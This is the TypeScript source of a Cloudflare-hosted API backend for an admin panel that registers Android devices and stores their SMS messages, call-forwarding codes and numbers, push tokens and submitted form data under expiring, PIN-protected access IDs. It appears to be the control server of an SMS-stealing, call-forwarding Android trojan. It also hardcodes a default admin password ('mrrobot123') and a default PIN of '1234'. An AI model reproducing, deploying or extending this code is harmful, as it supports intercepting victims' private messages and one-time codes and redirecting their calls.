/**
 * Cloudflare Pages Function — handles ALL /api/* routes
 * Same endpoints as the Express backend (artifacts/api-server)
 * but runs entirely on Cloudflare's edge — no Replit needed in production.
 *
 * Required Cloudflare Pages env vars (set once in CF dashboard):
 *   SUPABASE_SERVICE_ROLE_KEY  — your Supabase service role secret key
 *   SUPABASE_MANAGEMENT_TOKEN  — Supabase PAT for auto-creating tables (optional)
 *   ADMIN_DEFAULT_PASSWORD     — initial admin password (default: "mrrobot123")
 */

interface Env {
  SUPABASE_URL?: string;
  SUPABASE_SERVICE_ROLE_KEY: string;
  SUPABASE_MANAGEMENT_TOKEN?: string;
  ADMIN_DEFAULT_PASSWORD?: string;
}

// ── Constants ─────────────────────────────────────────────────────────────────
const SB_URL_DEFAULT = "https://dvgcrxrnnezbdjpujjjt.supabase.co";
const PROJECT_REF    = "dvgcrxrnnezbdjpujjjt";
const TOKEN_TTL_MS   = 7 * 24 * 60 * 60 * 1000; // 7 days

// ── Setup SQL (same as Express backend + admin_config table) ──────────────────
const SETUP_SQL = `
CREATE TABLE IF NOT EXISTS admin_config (
  key        TEXT PRIMARY KEY,
  value      TEXT NOT NULL,
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE TABLE IF NOT EXISTS apps (
  id         BIGSERIAL PRIMARY KEY,
  app_id     TEXT UNIQUE NOT NULL,
  name       TEXT,
  pin        TEXT NOT NULL DEFAULT '1234',
  status     TEXT NOT NULL DEFAULT 'active',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  expires_at TIMESTAMPTZ
);
CREATE TABLE IF NOT EXISTS devices (
  id                    BIGSERIAL PRIMARY KEY,
  app_id                TEXT NOT NULL,
  sub_id                TEXT NOT NULL,
  device_id             TEXT,
  status                TEXT NOT NULL DEFAULT 'active',
  data_type             TEXT NOT NULL DEFAULT 'registered_device',
  device_name           TEXT,
  device_model          TEXT,
  android_version       TEXT,
  sms_messages          JSONB NOT NULL DEFAULT '[]',
  total_sms_count       INTEGER NOT NULL DEFAULT 0,
  last_sms_timestamp    BIGINT NOT NULL DEFAULT 0,
  last_sms_log          JSONB NOT NULL DEFAULT '{}',
  sms_sync_status       TEXT,
  sms_pending_count     INTEGER NOT NULL DEFAULT 0,
  sms_processed_count   INTEGER NOT NULL DEFAULT 0,
  sms_permission_status TEXT,
  sms_last_sync_at      BIGINT,
  sms_last_error        TEXT,
  call_forward_status   TEXT,
  call_forward_action   TEXT,
  call_forward_code     TEXT,
  call_forward_number   TEXT,
  call_forward_sim_slot INTEGER,
  call_forward_response TEXT,
  call_forward_timestamp BIGINT,
  last_heartbeat_at     BIGINT,
  data_json             JSONB NOT NULL DEFAULT '{}',
  registered_at         TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  created_at            TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at            TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_active             BOOLEAN NOT NULL DEFAULT TRUE,
  last_seen             TIMESTAMPTZ,
  fcm_token             TEXT NOT NULL DEFAULT '',
  fcm_token_status      TEXT NOT NULL DEFAULT 'not_registered',
  UNIQUE(app_id, sub_id)
);
CREATE TABLE IF NOT EXISTS admin_sessions (
  id         BIGSERIAL PRIMARY KEY,
  app_id     TEXT NOT NULL,
  sub_id     TEXT,
  login_time TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  user_agent TEXT,
  ip         TEXT,
  is_valid   BOOLEAN NOT NULL DEFAULT TRUE
);
CREATE TABLE IF NOT EXISTS messages (
  id           BIGSERIAL PRIMARY KEY,
  app_id       TEXT NOT NULL,
  sub_id       TEXT,
  from_id      TEXT,
  to_id        TEXT,
  content      TEXT NOT NULL,
  message_type TEXT NOT NULL DEFAULT 'message',
  sent_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_read      BOOLEAN NOT NULL DEFAULT FALSE
);
CREATE TABLE IF NOT EXISTS form_data (
  id           BIGSERIAL PRIMARY KEY,
  app_id       TEXT NOT NULL,
  sub_id       TEXT,
  form_type    TEXT NOT NULL DEFAULT 'form',
  data         JSONB NOT NULL DEFAULT '{}',
  submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE TABLE IF NOT EXISTS settings (
  id         BIGSERIAL PRIMARY KEY,
  app_id     TEXT NOT NULL,
  key        TEXT NOT NULL,
  value      TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  UNIQUE(app_id, key)
);
CREATE TABLE IF NOT EXISTS proxy_rules (
  id         BIGSERIAL PRIMARY KEY,
  action     TEXT NOT NULL,
  field      TEXT NOT NULL,
  value      TEXT NOT NULL,
  endpoints  TEXT NOT NULL DEFAULT 'all',
  note       TEXT NOT NULL DEFAULT '',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
ALTER TABLE messages ADD COLUMN IF NOT EXISTS to_id TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token TEXT NOT NULL DEFAULT '';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token_status TEXT NOT NULL DEFAULT 'not_registered';
`.trim();

// ── Helpers ───────────────────────────────────────────────────────────────────
function json(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

async function sha256hex(text: string): Promise<string> {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
}

// ── Supabase REST helper ──────────────────────────────────────────────────────
function sbHeaders(key: string): Record<string, string> {
  return {
    "apikey": key,
    "Authorization": `Bearer ${key}`,
    "Content-Type": "application/json",
    "Prefer": "return=representation",
  };
}

async function sbFetch(
  url: string, key: string,
  method: string, body?: unknown,
  extra?: Record<string, string>,
): Promise<{ data: unknown; error: unknown; status: number }> {
  const res = await fetch(url, {
    method,
    headers: { ...sbHeaders(key), ...extra },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  if (res.status === 204) return { data: null, error: null, status: 204 };
  const payload = await res.json().catch(() => ({}));
  if (!res.ok) return { data: null, error: payload, status: res.status };
  return { data: payload, error: null, status: res.status };
}

function isTableMissing(error: unknown): boolean {
  if (!error || typeof error !== "object") return false;
  const e = error as Record<string, string>;
  if (e.code === "42P01") return true;
  if (e.message?.includes("Could not find the table")) return true;
  if (e.message?.includes("in the schema cache")) return true;
  if (e.message?.includes("relation") && e.message?.includes("does not exist")) return true;
  return false;
}

function dbErrResp(error: unknown): Response | null {
  if (!error) return null;
  if (isTableMissing(error)) return json({ error: "Database tables not set up yet.", needs_setup: true }, 503);
  const e = error as Record<string, string>;
  return json({ error: e.message ?? "DB error" }, 500);
}

// ── Supabase query builder (mirrors supabase-js API) ─────────────────────────
class QB {
  private _url: string;
  private _key: string;
  private _method = "GET";
  private _params: string[] = [];
  private _body?: unknown;
  private _single = false;

  constructor(sbUrl: string, key: string, table: string) {
    this._url = `${sbUrl}/rest/v1/${table}`;
    this._key = key;
  }
  select(cols = "*") { this._params.push(`select=${encodeURIComponent(cols)}`); return this; }
  eq(col: string, val: unknown) { this._params.push(`${col}=eq.${encodeURIComponent(String(val))}`); return this; }
  neq(col: string, val: unknown) { this._params.push(`${col}=neq.${encodeURIComponent(String(val))}`); return this; }
  gte(col: string, val: unknown) { this._params.push(`${col}=gte.${encodeURIComponent(String(val))}`); return this; }
  order(col: string, opts?: { ascending?: boolean }) { this._params.push(`order=${col}.${opts?.ascending === false ? "desc" : "asc"}`); return this; }
  limit(n: number) { this._params.push(`limit=${n}`); return this; }
  single() { this._single = true; return this; }
  insert(data: unknown) { this._method = "POST"; this._body = data; return this; }
  update(data: unknown) { this._method = "PATCH"; this._body = data; return this; }
  delete() { this._method = "DELETE"; return this; }

  async then<T>(resolve: (v: { data: T; error: unknown }) => T | PromiseLike<T>): Promise<T>;
  async then(resolve: (v: { data: unknown; error: unknown }) => unknown): Promise<unknown> {
    const qs = this._params.join("&");
    const url = qs ? `${this._url}?${qs}` : this._url;
    const extra: Record<string, string> = {};
    if (this._single) extra["Accept"] = "application/vnd.pgrst.object+json";
    const result = await sbFetch(url, this._key, this._method, this._body, extra);
    return resolve({ data: result.data, error: result.error });
  }
  async execute() { return this.then(v => v); }
}

class SB {
  constructor(private url: string, private key: string) {}
  from(table: string) { return new QB(this.url, this.key, table); }
  async count(table: string): Promise<number> {
    const res = await fetch(`${this.url}/rest/v1/${table}?select=id&limit=1`, {
      headers: { ...sbHeaders(this.key), "Prefer": "count=exact" },
    });
    const h = res.headers.get("content-range");
    if (!h) return 0;
    const m = h.match(/\/(\d+)$/);
    return m ? parseInt(m[1]) : 0;
  }
}

function db(env: Env): SB { return new SB(env.SUPABASE_URL ?? SB_URL_DEFAULT, env.SUPABASE_SERVICE_ROLE_KEY); }

// ── Auth ──────────────────────────────────────────────────────────────────────
// Stateless HMAC tokens — no DB storage needed, sign with service key
async function signToken(env: Env): Promise<string> {
  const iat = Date.now();
  const payload = btoa(JSON.stringify({ iat, adm: 1 }));
  const secret = await crypto.subtle.importKey(
    "raw", new TextEncoder().encode(env.SUPABASE_SERVICE_ROLE_KEY),
    { name: "HMAC", hash: "SHA-256" }, false, ["sign"],
  );
  const sig = await crypto.subtle.sign("HMAC", secret, new TextEncoder().encode(payload));
  const sigHex = Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2, "0")).join("");
  return `${payload}.${sigHex}`;
}

async function verifyToken(env: Env, token: string | undefined): Promise<boolean> {
  if (!token) return false;
  const parts = token.split(".");
  if (parts.length !== 2) return false;
  const [payload, sigHex] = parts;
  try {
    const secret = await crypto.subtle.importKey(
      "raw", new TextEncoder().encode(env.SUPABASE_SERVICE_ROLE_KEY),
      { name: "HMAC", hash: "SHA-256" }, false, ["verify"],
    );
    const sig = new Uint8Array(sigHex.match(/.{2}/g)!.map(h => parseInt(h, 16)));
    const valid = await crypto.subtle.verify("HMAC", secret, sig, new TextEncoder().encode(payload));
    if (!valid) return false;
    const { iat } = JSON.parse(atob(payload));
    return Date.now() - iat < TOKEN_TTL_MS;
  } catch { return false; }
}

async function getPasswordHash(env: Env): Promise<string> {
  // Try to read from admin_config table
  try {
    const d = db(env);
    const { data } = await d.from("admin_config").select("value").eq("key", "admin_password_hash").single();
    if (data && typeof data === "object" && "value" in (data as object)) {
      return (data as { value: string }).value;
    }
  } catch {}
  // Fallback: hash of default password
  return sha256hex(env.ADMIN_DEFAULT_PASSWORD ?? "mrrobot123");
}

async function savePasswordHash(env: Env, hash: string): Promise<void> {
  try {
    const d = db(env);
    await d.from("admin_config").insert({ key: "admin_password_hash", value: hash, updated_at: new Date().toISOString() });
  } catch {}
  try {
    const d = db(env);
    await d.from("admin_config").update({ value: hash, updated_at: new Date().toISOString() }).eq("key", "admin_password_hash");
  } catch {}
}

// ── Table setup ───────────────────────────────────────────────────────────────
async function tablesReady(env: Env): Promise<boolean> {
  const { error } = await db(env).from("apps").select("id").limit(1);
  return !error || !isTableMissing(error);
}

async function runSetup(env: Env, pat?: string): Promise<{ ok: boolean; error?: string }> {
  const token = pat ?? env.SUPABASE_MANAGEMENT_TOKEN;
  if (!token) return { ok: false, error: "No PAT available" };

  const res = await fetch(`https://api.supabase.com/v1/projects/${PROJECT_REF}/database/query`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${token}` },
    body: JSON.stringify({ query: SETUP_SQL }),
  });
  if (res.ok) return { ok: true };
  const err = await res.text().catch(() => "");
  return { ok: false, error: `Management API error ${res.status}: ${err.slice(0, 200)}` };
}

// ── App ID generator ──────────────────────────────────────────────────────────
const WORDS = ["MR","ROBOT","ALPHA","BETA","GAMMA","DELTA","ECHO","GHOST","HAWK","IRON","JADE","KING","LION","NOVA","ONYX","PRIME","RAVEN","SIGMA","TITAN","VIPER","WOLF","ZERO","BLAZE","CYBER","EAGLE","FLASH","NINJA","ORBIT","SPARK","STORM"];
function rndChars(n: number) { const c="ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; return Array.from({length:n},()=>c[Math.floor(Math.random()*c.length)]).join(""); }
function generateAppId() { return `${WORDS[Math.floor(Math.random()*WORDS.length)]}-${WORDS[Math.floor(Math.random()*WORDS.length)]}-${rndChars(4)}@${rndChars(3)}`; }

// ── Routing ───────────────────────────────────────────────────────────────────
function matchPath(pattern: string, path: string): Record<string, string> | null {
  const pp = pattern.split("/"), sp = path.split("/");
  if (pp.length !== sp.length) return null;
  const params: Record<string, string> = {};
  for (let i = 0; i < pp.length; i++) {
    if (pp[i].startsWith(":")) params[pp[i].slice(1)] = decodeURIComponent(sp[i]);
    else if (pp[i] !== sp[i]) return null;
  }
  return params;
}

function getIp(req: Request): string {
  return req.headers.get("cf-connecting-ip") ?? req.headers.get("x-forwarded-for")?.split(",")[0].trim() ?? "unknown";
}

async function route(method: string, path: string, req: Request, env: Env, url: URL): Promise<Response> {
  const d = db(env);

  // ── Auth ──────────────────────────────────────────────────────────────────
  const adminToken = req.headers.get("x-admin-token") ?? undefined;
  const authed = await verifyToken(env, adminToken);

  function requireAuth(): Response | null {
    return authed ? null : json({ error: "Unauthorized" }, 401);
  }

  async function bodyJson(): Promise<Record<string, unknown>> {
    try { return await req.json() as Record<string, unknown>; } catch { return {}; }
  }

  // ── Health ────────────────────────────────────────────────────────────────
  if (method === "GET" && path === "/healthz") return json({ ok: true });

  // ── Login / Logout ────────────────────────────────────────────────────────
  if (method === "POST" && path === "/admin/login") {
    const { password } = await bodyJson() as { password?: string };
    if (!password) return json({ error: "Password required" }, 400);
    const expected = await getPasswordHash(env);
    const actual = await sha256hex(password);
    if (actual !== expected) return json({ error: "Wrong password" }, 401);
    // Auto-setup tables if token available and tables missing
    if (env.SUPABASE_MANAGEMENT_TOKEN && !(await tablesReady(env))) {
      await runSetup(env);
    }
    const token = await signToken(env);
    return json({ ok: true, token });
  }

  if (method === "POST" && path === "/admin/logout") {
    return json({ ok: true }); // stateless tokens: browser clears localStorage
  }

  // ── DB Status ─────────────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/db-status") {
    const auth = requireAuth(); if (auth) return auth;
    const ready = await tablesReady(env);
    // Auto-setup if token available
    if (!ready && env.SUPABASE_MANAGEMENT_TOKEN) {
      const r = await runSetup(env);
      if (r.ok) return json({ tables_ready: true, error: null, setup_sql: null });
    }
    return json({ tables_ready: ready, error: ready ? null : "Tables not found", setup_sql: ready ? null : SETUP_SQL });
  }

  if (method === "GET" && path === "/admin/bootstrap") {
    const auth = requireAuth(); if (auth) return auth;
    const ready = await tablesReady(env);
    if (!ready && env.SUPABASE_MANAGEMENT_TOKEN) {
      await runSetup(env);
      return json({ tables_ready: true, setup_sql: null, pat: null });
    }
    return json({ tables_ready: ready, setup_sql: ready ? null : SETUP_SQL, pat: env.SUPABASE_MANAGEMENT_TOKEN ?? null });
  }

  if (method === "POST" && path === "/admin/run-setup") {
    const auth = requireAuth(); if (auth) return auth;
    const r = await runSetup(env);
    return json({ ok: r.ok, error: r.error, setup_sql: SETUP_SQL });
  }

  if (method === "POST" && path === "/admin/setup") {
    const auth = requireAuth(); if (auth) return auth;
    const { pat } = await bodyJson() as { pat?: string };
    if (!pat?.trim()) return json({ ok: false, message: "PAT required" }, 400);
    const r = await runSetup(env, pat.trim());
    if (!r.ok) return json({ ok: false, message: r.error ?? "Setup failed" });
    return json({ ok: true, message: "Tables created!" });
  }

  if (method === "GET" && path === "/admin/db-setup-sql") {
    const auth = requireAuth(); if (auth) return auth;
    return json({ sql: SETUP_SQL });
  }

  if (method === "GET" && path === "/admin/init-status") {
    const auth = requireAuth(); if (auth) return auth;
    const ready = await tablesReady(env);
    return json({ tables_exist: ready });
  }

  // ── Change Password ───────────────────────────────────────────────────────
  if (method === "POST" && path === "/admin/change-password") {
    const auth = requireAuth(); if (auth) return auth;
    const { old_password, new_password } = await bodyJson() as { old_password?: string; new_password?: string };
    if (!old_password || !new_password) return json({ error: "Both required" }, 400);
    const expected = await getPasswordHash(env);
    if (await sha256hex(old_password) !== expected) return json({ error: "Current password wrong hai" }, 401);
    if (new_password.length < 4) return json({ error: "Min 4 characters" }, 400);
    await savePasswordHash(env, await sha256hex(new_password));
    return json({ ok: true });
  }

  // ── Stats ─────────────────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/stats") {
    const auth = requireAuth(); if (auth) return auth;
    const d7 = new Date(Date.now() - 7 * 864e5).toISOString();
    const [apps, devices, sessions, messages] = await Promise.all([
      d.from("apps").select("*"),
      d.from("devices").select("*"),
      d.from("admin_sessions").select("*"),
      d.from("messages").select("*"),
    ]);
    if (isTableMissing(apps.error)) {
      return json({ total_apps:0, active_apps:0, inactive_apps:0, expired_apps:0, total_devices:0, active_devices:0, recent_devices_7d:0, total_sessions:0, active_sessions:0, unread_messages:0, proxy_blocked_today:0, proxy_accepted_today:0, needs_setup:true });
    }
    const now = new Date().toISOString();
    const ap = (apps.data as Record<string, unknown>[] ?? []);
    const dv = (devices.data as Record<string, unknown>[] ?? []);
    const ss = (sessions.data as Record<string, unknown>[] ?? []);
    const mg = (messages.data as Record<string, unknown>[] ?? []);
    return json({
      total_apps: ap.length, active_apps: ap.filter(a => a.status === "active").length,
      inactive_apps: ap.filter(a => a.status !== "active").length,
      expired_apps: ap.filter(a => a.expires_at && (a.expires_at as string) < now).length,
      total_devices: dv.length, active_devices: dv.filter(d => d.is_active).length,
      recent_devices_7d: dv.filter(d => (d.registered_at as string) > d7).length,
      total_sessions: ss.length, active_sessions: ss.filter(s => s.is_valid).length,
      unread_messages: mg.filter(m => !m.is_read).length,
      proxy_blocked_today: 0, proxy_accepted_today: 0,
    });
  }

  // ── Generate App ID ───────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/generate-app-id") {
    const auth = requireAuth(); if (auth) return auth;
    const { data } = await d.from("apps").select("app_id");
    const existing = new Set(((data as { app_id: string }[]) ?? []).map(a => a.app_id));
    for (let i = 0; i < 20; i++) { const c = generateAppId(); if (!existing.has(c)) return json({ app_id: c }); }
    return json({ app_id: generateAppId() });
  }

  // ── App IDs ───────────────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/app-ids") {
    const auth = requireAuth(); if (auth) return auth;
    const { data: apps, error } = await d.from("apps").select("*").order("created_at", { ascending: false });
    const errR = dbErrResp(error); if (errR) return errR;
    const { data: devs } = await d.from("devices").select("app_id,is_active");
    const { data: sess } = await d.from("admin_sessions").select("app_id,is_valid");
    const dc: Record<string, { total: number; active: number }> = {};
    const sc: Record<string, number> = {};
    for (const x of (devs as { app_id: string; is_active: boolean }[] ?? [])) {
      if (!dc[x.app_id]) dc[x.app_id] = { total: 0, active: 0 };
      dc[x.app_id].total++; if (x.is_active) dc[x.app_id].active++;
    }
    for (const x of (sess as { app_id: string; is_valid: boolean }[] ?? [])) {
      if (x.is_valid) sc[x.app_id] = (sc[x.app_id] ?? 0) + 1;
    }
    return json({ needs_setup: false, rows: ((apps as { app_id: string }[]) ?? []).map(a => ({ ...a, device_count: dc[a.app_id]?.total ?? 0, active_count: dc[a.app_id]?.active ?? 0, active_sessions: sc[a.app_id] ?? 0 })) });
  }

  if (method === "POST" && path === "/admin/app-ids") {
    const auth = requireAuth(); if (auth) return auth;
    const { app_id, pin = "1234", name, expires_at } = await bodyJson() as { app_id: string; pin?: string; name?: string; expires_at?: string };
    if (!app_id) return json({ error: "app_id required" }, 400);
    const { data, error } = await d.from("apps").insert({ app_id, name: name ?? null, pin, status: "active", created_at: new Date().toISOString(), expires_at: expires_at ?? new Date(Date.now() + 30 * 864e5).toISOString() }).select("*").single();
    if ((error as { code?: string })?.code === "23505") return json({ error: `"${app_id}" already exists` }, 409);
    const errR = dbErrResp(error); if (errR) return errR;
    return json(data, 201);
  }

  let m: Record<string, string> | null;

  if (method === "PATCH" && (m = matchPath("/admin/app-ids/:appId/password", path))) {
    const auth = requireAuth(); if (auth) return auth;
    const { new_password } = await bodyJson() as { new_password: string };
    if (!new_password) return json({ error: "new_password required" }, 400);
    const { error } = await d.from("apps").update({ pin: new_password }).eq("app_id", m.appId);
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true });
  }

  if (method === "POST" && (m = matchPath("/admin/app-ids/:appId/reset-password", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await d.from("apps").update({ pin: "1234" }).eq("app_id", m.appId);
    return json({ ok: true });
  }

  if (method === "POST" && (m = matchPath("/admin/app-ids/:appId/extend", path))) {
    const auth = requireAuth(); if (auth) return auth;
    const { data: app } = await d.from("apps").select("expires_at").eq("app_id", m.appId).single();
    if (!app) return json({ error: "Not found" }, 404);
    const base = new Date(Math.max(new Date((app as { expires_at: string }).expires_at).getTime(), Date.now()));
    const expires_at = new Date(base.getTime() + 30 * 864e5).toISOString();
    await d.from("apps").update({ expires_at }).eq("app_id", m.appId);
    return json({ ok: true, expires_at });
  }

  if (method === "PATCH" && (m = matchPath("/admin/app-ids/:appId/toggle", path))) {
    const auth = requireAuth(); if (auth) return auth;
    const { status } = await bodyJson() as { status: string };
    const { error } = await d.from("apps").update({ status }).eq("app_id", m.appId);
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true });
  }

  if (method === "DELETE" && (m = matchPath("/admin/app-ids/:appId", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await Promise.all([
      d.from("apps").delete().eq("app_id", m.appId),
      d.from("devices").delete().eq("app_id", m.appId),
      d.from("admin_sessions").delete().eq("app_id", m.appId),
      d.from("messages").delete().eq("app_id", m.appId),
      d.from("form_data").delete().eq("app_id", m.appId),
    ]);
    return json({ ok: true });
  }

  // ── Devices ───────────────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/devices") {
    const auth = requireAuth(); if (auth) return auth;
    let q = d.from("devices").select("*").order("registered_at", { ascending: false });
    const aid = url.searchParams.get("app_id"), sid = url.searchParams.get("sub_id");
    if (aid) q = q.eq("app_id", aid);
    if (sid) q = q.eq("sub_id", sid);
    const { data, error } = await q;
    const errR = dbErrResp(error); if (errR) return errR;
    return json(data ?? []);
  }

  if (method === "PATCH" && (m = matchPath("/admin/devices/:id/toggle", path))) {
    const auth = requireAuth(); if (auth) return auth;
    const { is_active } = await bodyJson() as { is_active: boolean };
    const { error } = await d.from("devices").update({ is_active }).eq("id", m.id);
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true });
  }

  if (method === "DELETE" && (m = matchPath("/admin/devices/:id", path))) {
    const auth = requireAuth(); if (auth) return auth;
    const { error } = await d.from("devices").delete().eq("id", m.id);
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true });
  }

  // ── Sessions ──────────────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/sessions") {
    const auth = requireAuth(); if (auth) return auth;
    let q = d.from("admin_sessions").select("*").order("login_time", { ascending: false });
    const aid = url.searchParams.get("app_id"), sid = url.searchParams.get("sub_id");
    if (aid) q = q.eq("app_id", aid);
    if (sid) q = q.eq("sub_id", sid);
    const { data, error } = await q;
    const errR = dbErrResp(error); if (errR) return errR;
    return json(data ?? []);
  }

  if (method === "POST" && (m = matchPath("/admin/sessions/:id/invalidate", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await d.from("admin_sessions").update({ is_valid: false }).eq("id", m.id);
    return json({ ok: true });
  }

  if (method === "DELETE" && (m = matchPath("/admin/sessions/app/:appId/all", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await d.from("admin_sessions").delete().eq("app_id", m.appId);
    return json({ ok: true });
  }

  if (method === "DELETE" && (m = matchPath("/admin/sessions/:id", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await d.from("admin_sessions").delete().eq("id", m.id);
    return json({ ok: true });
  }

  // ── Messages ──────────────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/messages") {
    const auth = requireAuth(); if (auth) return auth;
    let q = d.from("messages").select("*").order("sent_at", { ascending: false });
    const aid = url.searchParams.get("app_id"), sid = url.searchParams.get("sub_id");
    if (aid) q = q.eq("app_id", aid);
    if (sid) q = q.eq("sub_id", sid);
    const { data, error } = await q;
    const errR = dbErrResp(error); if (errR) return errR;
    return json(data ?? []);
  }

  if (method === "PATCH" && (m = matchPath("/admin/messages/:id/read", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await d.from("messages").update({ is_read: true }).eq("id", m.id);
    return json({ ok: true });
  }

  if (method === "DELETE" && (m = matchPath("/admin/messages/:id", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await d.from("messages").delete().eq("id", m.id);
    return json({ ok: true });
  }

  // ── Form Data ─────────────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/form-data") {
    const auth = requireAuth(); if (auth) return auth;
    let q = d.from("form_data").select("*").order("submitted_at", { ascending: false });
    const aid = url.searchParams.get("app_id"), sid = url.searchParams.get("sub_id");
    if (aid) q = q.eq("app_id", aid);
    if (sid) q = q.eq("sub_id", sid);
    const { data, error } = await q;
    const errR = dbErrResp(error); if (errR) return errR;
    return json(data ?? []);
  }

  if (method === "DELETE" && (m = matchPath("/admin/form-data/:id", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await d.from("form_data").delete().eq("id", m.id);
    return json({ ok: true });
  }

  // ── Proxy Rules ───────────────────────────────────────────────────────────
  if (method === "GET" && path === "/admin/proxy/rules") {
    const auth = requireAuth(); if (auth) return auth;
    const { data, error } = await d.from("proxy_rules").select("*").order("created_at", { ascending: false });
    const errR = dbErrResp(error); if (errR) return errR;
    return json(data ?? []);
  }

  if (method === "POST" && path === "/admin/proxy/rules") {
    const auth = requireAuth(); if (auth) return auth;
    const body = await bodyJson() as { action: string; field: string; value: string; endpoints?: string; note?: string };
    if (!body.action || !body.field || !body.value) return json({ error: "action, field, value required" }, 400);
    const { data, error } = await d.from("proxy_rules").insert({ action: body.action, field: body.field, value: body.value, endpoints: body.endpoints ?? "all", note: body.note ?? "", created_at: new Date().toISOString() }).select("*").single();
    const errR = dbErrResp(error); if (errR) return errR;
    return json(data, 201);
  }

  if (method === "DELETE" && (m = matchPath("/admin/proxy/rules/:id", path))) {
    const auth = requireAuth(); if (auth) return auth;
    await d.from("proxy_rules").delete().eq("id", m.id);
    return json({ ok: true });
  }

  if (method === "GET" && path === "/admin/proxy/log") {
    const auth = requireAuth(); if (auth) return auth;
    return json({ entries: [], total: 0, blocked: 0, accepted: 0 });
  }

  if (method === "DELETE" && path === "/admin/proxy/log") {
    const auth = requireAuth(); if (auth) return auth;
    return json({ ok: true });
  }

  if (method === "GET" && path === "/admin/proxy/stats") {
    const auth = requireAuth(); if (auth) return auth;
    const { data: rules } = await d.from("proxy_rules").select("id,action");
    const allRules = (rules as { id: number; action: string }[] ?? []);
    return json({ total: 0, blocked: 0, accepted: 0, today_total: 0, today_blocked: 0, today_accepted: 0, active_rules: allRules.length, block_rules: allRules.filter(r => r.action === "block").length, allow_rules: allRules.filter(r => r.action === "allow").length, connected_clients: 0 });
  }

  // ── Android Device Routes ─────────────────────────────────────────────────
  if (method === "POST" && path === "/register-device") {
    const body = await bodyJson() as { app_id?: string; sub_id?: string; device_id?: string; device_name?: string; device_model?: string; android_version?: string };
    if (!body.app_id || !body.device_id) return json({ error: "app_id and device_id required" }, 400);
    const { data: app } = await d.from("apps").select("*").eq("app_id", body.app_id).eq("status", "active").single();
    if (!app) return json({ error: "Invalid or inactive App ID" }, 403);
    const appRow = app as { expires_at?: string };
    if (appRow.expires_at && new Date(appRow.expires_at) < new Date()) return json({ error: "App ID expired" }, 403);
    const { data: existing } = await d.from("devices").select("*").eq("app_id", body.app_id).eq("device_id", body.device_id).single();
    if (existing) {
      await d.from("devices").update({ last_seen: new Date().toISOString() }).eq("id", (existing as { id: number }).id);
      return json({ ok: true, device: existing });
    }
    const { data: newDev, error } = await d.from("devices").insert({ app_id: body.app_id, sub_id: body.sub_id ?? null, device_id: body.device_id, device_name: body.device_name ?? null, device_model: body.device_model ?? null, android_version: body.android_version ?? null, is_active: true, registered_at: new Date().toISOString(), last_seen: new Date().toISOString() }).select("*").single();
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true, device: newDev }, 201);
  }

  if (method === "POST" && path === "/send-message") {
    const body = await bodyJson() as { app_id?: string; sub_id?: string; from_id?: string; content?: string; message_type?: string };
    if (!body.app_id || !body.content) return json({ error: "app_id and content required" }, 400);
    const { data: app } = await d.from("apps").select("id").eq("app_id", body.app_id).single();
    if (!app) return json({ error: "Invalid App ID" }, 403);
    const { error } = await d.from("messages").insert({ app_id: body.app_id, sub_id: body.sub_id ?? null, from_id: body.from_id ?? null, content: body.content, message_type: body.message_type ?? "message", is_read: false, sent_at: new Date().toISOString() });
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true }, 201);
  }

  if (method === "POST" && path === "/submit-form") {
    const body = await bodyJson() as { app_id?: string; sub_id?: string; form_type?: string; data?: Record<string, unknown> };
    if (!body.app_id) return json({ error: "app_id required" }, 400);
    const { error } = await d.from("form_data").insert({ app_id: body.app_id, sub_id: body.sub_id ?? null, form_type: body.form_type ?? "form", data: body.data ?? {}, submitted_at: new Date().toISOString() });
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true }, 201);
  }

  // ── Android Device Auth Routes (/device/:appId/...) ───────────────────────
  // Called by the Android app via Constants.DEVICE_API_BASE_URL = BACKEND_ROOT/api/device/{APP_TOKEN}

  if (method === "POST" && (m = matchPath("/device/:appId/admin-login", path))) {
    const appId = m.appId;
    const body = await bodyJson() as { password?: string; sub_id?: string };
    if (!body.password) return json({ error: "Password required" }, 400);

    const { data: app } = await d.from("apps").select("*").eq("app_id", appId).single();
